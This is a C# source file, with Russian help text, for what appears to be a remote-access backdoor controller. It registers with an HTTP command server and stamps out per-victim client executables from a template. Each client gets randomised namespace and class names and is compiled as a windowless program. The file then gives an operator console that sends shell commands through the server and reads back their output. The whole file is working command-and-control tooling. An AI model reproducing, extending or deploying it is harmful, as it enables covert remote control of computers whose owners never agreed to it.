using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Diagnostics;

namespace RemoteCmdControl{
    static class Program{
        static Random rand = new Random();
        static string randChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_";

        static void Main(string[] args){
            if(args.Length < 2 || args[0] == "-h" || args[0] == "--help"){
                Console.WriteLine(@"
remotecmd [-n <host>] [-c <id> <host>]
    -n <host>
        Создать новый клиент.
            host: URL для RemoteCmd API

    -c <id> <host>
        Подключиться к запущенному клиенту.
            id: Уникальный ID клиента
            host: URL для RemoteCmd API");
                return;
            }

            if(args[0] == "-n"){
                string id = Request($"{args[1]}/register");
                string currDir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
                string src = @$"{currDir}\client_{id}.cs";
                string exe = @$"{currDir}\client_{id}.exe";

                string clientCode = File.ReadAllText(@$"{currDir}\client.cs");
                clientCode = clientCode.Replace("$HOST", args[1]);
                clientCode = clientCode.Replace("$ID", id);
                clientCode = clientCode.Replace("$RAND_NS", GetRandString(30));
                clientCode = clientCode.Replace("$RAND", GetRandString(30));
                File.WriteAllText(src, clientCode);

                CompileCS(src, exe);

                File.Delete(src);

                Console.WriteLine($"ID: {id}{Environment.NewLine}Путь к EXE: {exe}");
            }else if(args[0] == "-c"){
                string id = args[1], host = args[2];
                while(true){
                    Console.Write($"{id}@{host}> ");
                    string cmd = WebUtility.UrlEncode(Console.ReadLine());

                    if(cmd == "exit"){
                        Request($"{host}/set?id={id}&data=cmd&txt=null");
                        Request($"{host}/set?id={id}&data=result&txt=null");
                        Environment.Exit(0);
                    }

                    if(cmd == "cls"){
                        Console.Clear();
                        continue;
                    }

                    Request($"{host}/set?id={id}&data=cmd&txt={cmd}");

                    string result = "";
                    while(true){
                        result = WebUtility.UrlDecode(Request($"{host}/get?id={id}&data=result&nc="+GetRandString(10)));
                        if(result != "null") break;
                        Thread.Sleep(100);
                    }

                    Console.WriteLine(result.Trim());
                    Request($"{host}/set?id={id}&data=result&txt=null");
                }
            }
        }

        static string GetRandString(int length){
            string s = "_";
            for(int i = 0; i < length-1; i++) s += randChars[rand.Next(randChars.Length)];
            return s;
        }

        public static string GetPath(string p){
            if (p.Length == 0) p = ".";
            return Path.IsPathRooted(p) ? p : Path.GetFullPath(p);
        }

        static string Request(string url){
			try{
				var req = WebRequest.Create(url);
				req.Method = "GET";

				var stream = req.GetResponse().GetResponseStream();
				var data = new StreamReader(stream).ReadToEnd();

				return data;
			}
			catch(Exception){
				return "null";
			}
        }

        static void CompileCS(string srcFile, string outFile){
            try{
                string windir = Environment.GetEnvironmentVariable("windir");
                var frDirA = Directory.GetDirectories(@$"{windir}\Microsoft.NET\Framework", "v4*");
                if(frDirA.Length == 0){
                    Console.WriteLine("CSC не найден.");
                    Environment.Exit(1);
                }
                string csc = frDirA[0]+@"\csc.exe";
                
                var p = new Process();
                p.StartInfo.FileName = csc;
                p.StartInfo.Arguments = @$"/nologo /target:winexe ""/out:{GetPath(outFile)}"" ""{GetPath(srcFile)}""";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

                p.Start();
                p.WaitForExit();
            }catch(Exception ex){
                Console.WriteLine(ex.Message);
                Environment.Exit(1);
            }
        }
    }
}